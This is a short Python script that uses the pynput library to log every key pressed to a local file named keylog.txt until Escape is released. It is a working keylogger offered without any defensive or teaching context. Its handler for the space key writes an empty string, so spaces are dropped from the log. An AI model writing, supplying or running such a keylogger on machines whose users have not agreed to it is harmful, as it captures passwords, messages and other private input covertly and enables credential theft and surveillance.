import pynput
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == key.space:
            with open(log_file, "a") as f:
                f.write("")
        
        else:
            with open(log_file, "a") as f:
                f.write(f"[{str(key)}]")

def on_release(key):
    if key == Key.esc:

        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
